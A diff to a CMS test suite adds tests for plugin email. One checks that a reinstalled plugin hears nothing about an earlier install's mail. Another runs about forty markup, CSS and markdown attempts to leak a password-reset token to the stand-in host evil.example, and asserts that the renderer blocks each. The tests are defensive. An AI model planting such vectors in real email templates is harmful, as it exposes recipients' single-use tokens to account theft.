@@ -679,6 +679,44 @@ describe('email for plugins', () => {
       ])
     })
 
+    it('tells a new install of the same id nothing about the email of the one before it', async () => {
+      await install(BOTH)
+      await readyConnector()
+      const remove = () => h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })
+
+      // News held for an install that is then removed.
+      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' }, reference: 'held-for-the-old-one' })
+      await setEnabled(false)
+      now += 25 * 60 * 60 * 1000
+      await drain(async () => null)
+      await new Promise((resolve) => setTimeout(resolve, 50))
+      await remove()
+      expect((await install(BOTH)).status).toBe(201)
+      expect(await heard()).toEqual([])
+
+      // An email the old install had with the provider when it was replaced.
+      now = Date.now() + 5_000
+      const memberId = await activeMember()
+      await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/' }, reference: 'in-flight' })
+      let carried = 0
+      await drain(async () => {
+        carried += 1
+        await remove()
+        await new Promise((resolve) => setTimeout(resolve, 5))
+        expect((await install(BOTH)).status).toBe(201)
+        return null
+      })
+      expect(carried).toBe(1)
+      expect(await heard()).toEqual([])
+
+      // Its own email it does hear about.
+      await send({ template: 'ticket.opened', to: { address: 'b@example.com' }, variables: { subject: 'a' }, reference: 'mine' })
+      await drain(async () => null)
+      expect(await heard()).toEqual([
+        { event: 'mail.delivered', template: 'ticket.opened', to: { address: 'b@example.com' }, reference: 'mine' },
+      ])
+    })
+
     it('never leaves a template missing while another plugin is removed or the plugin itself is upgraded', async () => {
       await install(BOTH)
       await readyConnector()
@@ -786,6 +824,87 @@ describe('email for plugins', () => {
         expect(html).not.toContain('evil.example')
         expect(html).toContain('href="#"')
       }
+    })
+
+    it('gives a secret value to no address but its own, whatever the markup tries', () => {
+      const SECRET = 'https://site.example/reset?token=single-use-secret'
+      const attempts = [
+        // Quoting, spacing and case a second reader of the markup could take differently.
+        `<a href='https://evil.example/?t={link}'>x</a>`,
+        '<a href=https://evil.example/?t={link}>x</a>',
+        '<a href = "https://evil.example/?t={link}">x</a>',
+        '<A HREF="https://evil.example/?t={link}">x</A>',
+        '<a href="https://evil.example/?t={link}\n">x</a>',
+        '<a\nhref="https://evil.example/\n?t={link}">x</a>',
+        '<a href="&#104;ttps://evil.example/?t={link}">x</a>',
+        '<a href="https://evil.example/?t=&#x7b;link&#x7d;">x</a>',
+        '<a href="https://evil.example/?t=&lbrace;link&rbrace;">x</a>',
+        '<a href=`https://evil.example/?t={link}`>x</a>',
+        '<a href="x" href="https://evil.example/?t={link}">x</a>',
+        '<a title="\'>" href="https://evil.example/?t={link}">x</a>',
+        '<a href="//evil.example/?t={link}">x</a>',
+        '<a href="{link}@evil.example/">x</a>',
+        '<a href="https://evil.example/#{link}">x</a>',
+        // Attributes other than href and src that take an address.
+        '<img srcset="https://evil.example/?t={link} 1x" src="https://example.com/a.png">',
+        '<img src="https://evil.example/?t={link}">',
+        '<table background="https://evil.example/?t={link}"><tr><td>x</td></tr></table>',
+        '<form action="https://evil.example/?t={link}"><button formaction="https://evil.example/?t={link}">x</button></form>',
+        '<svg><a xlink:href="https://evil.example/?t={link}"><text>x</text></a></svg>',
+        '<p style="background:url(https://evil.example/?t={link})">x</p>',
+        '<style>p { background: url("https://evil.example/?t={link}") }</style>',
+        '<a href="#" ping="https://evil.example/?t={link}">x</a>',
+        '<link rel="stylesheet" href="https://evil.example/?t={link}">',
+        '<base href="https://evil.example/?t={link}">',
+        '<meta http-equiv="refresh" content="0;url=https://evil.example/?t={link}">',
+        '<object data="https://evil.example/?t={link}"></object>',
+        '<video poster="https://evil.example/?t={link}"></video>',
+        // An address in plain text, which mail clients turn into a link themselves.
+        'Go to https://evil.example/?t={link} now',
+        'https://evil.example/?t=<b>{link}</b>',
+        'https://evil.example/?t=**{link}**',
+        '<code>https://evil.example/?t=</code>{link}',
+        // Markdown.
+        '[x](https://evil.example/?t={link})',
+        '[x](<https://evil.example/?t={link}>)',
+        '[x](https://evil.example/?t={link} "title")',
+        '[x][ref]\n\n[ref]: https://evil.example/?t={link}',
+        '<https://evil.example/?t={link}>',
+        '[![x](https://evil.example/?t={link})]({link})',
+        '[a [b](https://evil.example/?t={link}) c]({link})',
+        '![x](https://evil.example/?t={link})',
+      ]
+      for (const templateKey of [key, CORE_KEY]) {
+        for (const attempt of attempts) {
+          const rendered = renderMailTemplate({ key: templateKey, subject: 'S', body: attempt }, { 'site.name': 'Site', link: SECRET })
+          for (const part of [body(rendered.html), rendered.text]) {
+            // The secret may appear as its own address or as words; never beside the other host.
+            const leaked = part.split(/["'\s<>()]/).some((piece) => piece.includes('evil.example') && piece.includes('single-use-secret'))
+            expect({ attempt, templateKey, leaked }).toEqual({ attempt, templateKey, leaked: false })
+          }
+          // No attribute at all carries the secret except a link or image address that is exactly it.
+          const inAttributes = [...body(rendered.html).matchAll(/\s([a-z:-]+)="([^"]*)"/g)].filter((match) => match[2].includes('single-use-secret'))
+          for (const match of inAttributes) {
+            expect(['href', 'src']).toContain(match[1])
+            expect(match[2].replace(/&amp;/g, '&')).toBe(SECRET)
+          }
+        }
+      }
+    })
+
+    it('still makes a link of a variable that is the whole address, in the HTML and the text', () => {
+      const link = 'https://site.example/reset?token=abc&x=1'
+      for (const source of ['[Reset]({link})', '<a href="{link}">Reset</a>', "<a href=' {link} '>Reset</a>", '<a href="&#x7b;link&#x7d;">Reset</a>']) {
+        const rendered = renderMailTemplate({ key, subject: 'S', body: source }, { 'site.name': 'Site', link })
+        expect(body(rendered.html)).toContain('href="https://site.example/reset?token=abc&amp;x=1"')
+        expect(rendered.text).toBe(`Reset (${link})`)
+      }
+      // Nor does a subject carry it to another host.
+      const subject = renderMailTemplate({ key, subject: 'See https://evil.example/?t={link}', body: 'x' }, { link }).subject
+      expect(subject).toBe('See https://evil.example/?t={link}')
+      // A value is text in a text node, markup and all, and is not read again for more variables.
+      const text = render('Hello {name}.', { name: '<b>{link}</b>', link })
+      expect(text).toContain('Hello &lt;b&gt;{link}&lt;/b&gt;.')
     })
 
     it('loads nothing when a plugin\'s email is opened, and links a plugin\'s template only to https', () => {
